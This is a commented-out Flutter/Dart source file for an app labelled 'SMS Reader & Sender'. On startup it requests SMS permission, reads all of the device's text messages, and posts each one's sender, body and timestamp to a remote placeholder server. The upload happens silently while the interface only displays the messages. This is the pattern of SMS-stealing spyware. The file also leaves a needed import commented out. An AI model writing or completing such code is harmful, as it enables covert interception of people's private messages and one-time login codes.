// import 'package:flutter/material.dart';
// import 'package:http/http.dart' as http;
// import 'package:permission_handler/permission_handler.dart';
// import 'dart:convert';
// // import 'package:sms_advanced/sms_advanced.dart';
//
// class SmsApp extends StatefulWidget {
//   @override
//   _SmsAppState createState() => _SmsAppState();
// }
//
// class _SmsAppState extends State<SmsApp> {
//   bool _smsPermissionGranted = false;
//   List<SmsMessage> _messages = []; // Fixed: Uncommented _messages
//
//   @override
//   void initState() {
//     super.initState();
//     requestSmsPermission();
//   }
//
//   // Request SMS permission
//   Future<void> requestSmsPermission() async {
//     PermissionStatus status = await Permission.sms.request();
//     if (status.isGranted) {
//       setState(() {
//         _smsPermissionGranted = true;
//       });
//       fetchSmsMessages();
//     } else {
//       setState(() {
//         _smsPermissionGranted = false;
//       });
//     }
//   }
//
//   // Fetch SMS messages from the device
//   void fetchSmsMessages() async {
//     SmsQuery query = SmsQuery();
//     List<SmsMessage> messages = await query.getAllSms; // Fixed: Use `await`
//     setState(() {
//       _messages = messages;
//     });
//
//     // Send SMS details to the server
//     for (SmsMessage message in messages) {
//       sendSmsToServer(message);
//     }
//   }
//
//   // Send SMS data to the server
//   Future<void> sendSmsToServer(SmsMessage smsMessage) async {
//     final Uri apiUrl = Uri.parse('https://yourserver.com/sms_data');
//     try {
//       Map<String, dynamic> data = {
//         "device_id": "DEVICE_UNIQUE_ID",  // Replace with actual device ID
//         "sender": smsMessage.sender,
//         "message": smsMessage.body,
//         "timestamp": smsMessage.dateSent.toString(),
//       };
//
//       var response = await http.post(
//         apiUrl,
//         headers: {"Content-Type": "application/json"},
//         body: jsonEncode(data),
//       );
//
//       if (response.statusCode == 200) {
//         print("SMS sent successfully.");
//       } else {
//         print("Failed to send SMS: ${response.statusCode}");
//       }
//     } catch (e) {
//       print("Error sending SMS data: $e");
//     }
//   }
//
//   @override
//   Widget build(BuildContext context) {
//     return MaterialApp(
//       home: Scaffold(
//         appBar: AppBar(
//           title: Text('SMS Reader & Sender'),
//         ),
//         body: Center(
//           child: Column(
//             mainAxisAlignment: MainAxisAlignment.center,
//             children: <Widget>[
//               _smsPermissionGranted
//                   ? ElevatedButton(
//                 onPressed: fetchSmsMessages,
//                 child: Text("Fetch SMS Messages"),
//               )
//                   : Text("SMS permission is required to proceed."),
//               SizedBox(height: 20),
//               Text("Fetched SMS Messages:"),
//               Expanded(
//                 child: ListView.builder(
//                   itemCount: _messages.length,
//                   itemBuilder: (context, index) {
//                     return ListTile(
//                       title: Text("Sender: ${_messages[index].sender}"),
//                       subtitle: Text(_messages[index].body ?? ""),
//                     );
//                   },
//                 ),
//               ),
//             ],
//           ),
//         ),
//       ),
//     );
//   }
// }
